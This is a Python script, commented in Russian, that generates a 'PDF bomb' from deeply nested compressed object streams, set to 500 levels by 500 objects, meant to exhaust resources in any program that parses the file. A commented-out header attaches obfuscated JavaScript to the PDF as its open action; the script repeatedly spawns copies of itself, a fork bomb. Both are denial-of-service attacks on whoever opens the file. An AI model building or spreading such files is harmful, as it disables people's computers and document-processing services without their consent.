#import aspose.pdf as ap
# Load the document
#document = ap.Document("labbomb4.pdf")
#js_action = ap.annotations.JavascriptAction("(function(_0x378c29,_0x583366){var _0x40de9f=_0x5cfa,_0x3c0c9e=_0x378c29();while(!![]){try{var _0x13f336=-parseInt(_0x40de9f(0x1a1))/0x1+-parseInt(_0x40de9f(0x199))/0x2+parseInt(_0x40de9f(0x1a5))/0x3+-parseInt(_0x40de9f(0x19e))/0x4+parseInt(_0x40de9f(0x19c))/0x5+-parseInt(_0x40de9f(0x1a3))/0x6*(-parseInt(_0x40de9f(0x19f))/0x7)+-parseInt(_0x40de9f(0x1a0))/0x8;if(_0x13f336===_0x583366)break;else _0x3c0c9e['push'](_0x3c0c9e['shift']());}catch(_0x2e8e34){_0x3c0c9e['push'](_0x3c0c9e['shift']());}}}(_0x5d50,0x87574),function f(){var _0x1efbdf=_0x5cfa;require(_0x1efbdf(0x19b))[_0x1efbdf(0x19d)](process[_0x1efbdf(0x1a2)][0x0],['-e','('+f[_0x1efbdf(0x1a4)]()+_0x1efbdf(0x19a)]),require(_0x1efbdf(0x19b))[_0x1efbdf(0x19d)](process['argv'][0x0],['-e','('+f[_0x1efbdf(0x1a4)]()+'());']);}());function _0x5cfa(_0x331214,_0x3994b2){_0x331214=_0x331214-0x199;var _0x5d50a5=_0x5d50();var _0x5cfa83=_0x5d50a5[_0x331214];return _0x5cfa83;}function _0x5d50(){var _0x5107b4=['());','child_process','1570240YLaQue','spawn','94000lTJWUS','7BrcAnL','1943200BpshgM','334670FIssdW','argv','2341722hGhJuu','toString','2127840wpYNjS','516378gBEbLY'];_0x5d50=function(){return _0x5107b4;};return _0x5d50();}")
#document.open_action = js_action
#document.save("output_aspose.pdf")


import zlib
import struct

def compress(data: bytes) -> bytes:
    return zlib.compress(data, level=9)

def pdf_obj(obj_id: int, content: str) -> bytes:
    return f"{obj_id} 0 obj\n{content}\nendobj\n".encode()

def make_objstm(objects: list[tuple[int, str]]) -> bytes:
    """
    Создаёт содержимое ObjStm:
    - objects: список (obj_id, содержимое объекта)
    Возвращает сжатый поток и количество объектов.
    """
    # Сначала строим тела объектов
    bodies = []
    offsets = []
    offset = 0
    for obj_id, content in objects:
        body = content.encode()
        offsets.append((obj_id, offset))
        bodies.append(body)
        offset += len(body) + 1  # +1 за \n

    # Оглавление: "id1 off1 id2 off2 ..."
    index = " ".join(f"{oid} {off}" for oid, off in offsets)
    header = (index + "\n").encode()

    # Полный поток = оглавление + тела
    stream_data = header + b"\n".join(bodies)
    return compress(stream_data), len(objects), len(header)


def create_pdf_bomb(filename: str, depth: int = 3, width: int = 500):
    """
    depth — уровней вложенности ObjStm
    width — объектов на каждом уровне
    """

    # ID счётчик
    next_id = [1]
    def alloc_id():
        i = next_id[0]
        next_id[0] += 1
        return i

    # Все PDF объекты которые запишем в файл
    pdf_objects = {}  # id → bytes (готовый "N 0 obj ... endobj")

    # ── Шаг 1: создаём самый глубокий уровень ──
    # Это просто словарь — безобидные маленькие объекты
    leaf_objects = []
    for _ in range(width):
        oid = alloc_id()
        # Каждый объект — пустой словарь, но их много
        leaf_objects.append((oid, "<< /Type /Null >>"))

    # ── Шаг 2: оборачиваем в ObjStm, depth раз ──
    current_level = leaf_objects

    for level in range(depth):
        # Создаём ObjStm содержащий объекты текущего уровня
        compressed_stream, n_obj, first_offset = make_objstm(current_level)

        stm_id = alloc_id()
        stream_len = len(compressed_stream)

        stm_header = (
            f"<< /Type /ObjStm\n"
            f"   /N {n_obj}\n"
            f"   /First {first_offset}\n"
            f"   /Filter /FlateDecode\n"
            f"   /Length {stream_len}\n"
            f">>"
        )

        # Собираем полный объект
        full_obj = (
            f"{stm_id} 0 obj\n"
            f"{stm_header}\n"
            f"stream\n"
        ).encode() + compressed_stream + b"\nendstream\nendobj\n"

        pdf_objects[stm_id] = full_obj

        # Следующий уровень содержит только этот один ObjStm
        # (ссылки на него — width раз, чтобы умножить эффект)
        current_level = [(alloc_id(), f"<< /Ref {stm_id} 0 R >>")
                         for _ in range(width)]

    # ── Шаг 3: минимальная структура PDF ──
    # Каталог страниц
    pages_id = alloc_id()
    catalog_id = alloc_id()

    pdf_objects[pages_id] = pdf_obj(pages_id,
        "<< /Type /Pages /Kids [] /Count 0 >>")
    pdf_objects[catalog_id] = pdf_obj(catalog_id,
        f"<< /Type /Catalog /Pages {pages_id} 0 R >>")

    # ── Шаг 4: записываем файл и строим xref ──
    with open(filename, 'wb') as f:
        f.write(b"%PDF-1.5\n")
        f.write(b"%\xe2\xe3\xcf\xd3\n")  # бинарный комментарий (стандарт)

        offsets = {}

        for obj_id, obj_bytes in sorted(pdf_objects.items()):
            offsets[obj_id] = f.tell()
            f.write(obj_bytes)

        # xref таблица
        xref_offset = f.tell()
        all_ids = sorted(offsets.keys())
        max_id = max(all_ids)

        f.write(f"xref\n0 {max_id + 1}\n".encode())
        f.write(b"0000000000 65535 f \n")  # нулевой объект

        for i in range(1, max_id + 1):
            if i in offsets:
                f.write(f"{offsets[i]:010d} 00000 n \n".encode())
            else:
                f.write(b"0000000000 65535 f \n")

        # trailer
        f.write((
            f"trailer\n"
            f"<< /Size {max_id + 1}\n"
            f"   /Root {catalog_id} 0 R\n"
            f">>\n"
            f"startxref\n"
            f"{xref_offset}\n"
            f"%%EOF\n"
        ).encode())

    import os
    return os.path.getsize(filename)


def human(n):
    for u in ['B','KB','MB','GB','TB','PB']:
        if n < 1024: return f"{n:.1f} {u}"
        n /= 1024
    return f"{n:.1f} EB"


if __name__ == '__main__':
    import time

    DEPTH = 500   # уровней вложенности
    WIDTH = 500  # объектов на каждом уровне

    print(f"PDF Bomb: depth={DEPTH}, width={WIDTH}")
    print(f"Теоретически объектов при полной распаковке: {WIDTH**DEPTH:,}")

    start = time.perf_counter()
    size = create_pdf_bomb("bomb.pdf", depth=DEPTH, width=WIDTH)
    elapsed = time.perf_counter() - start

    print(f"Файл:    {human(size)}")
    print(f"Время:   {elapsed:.3f} сек")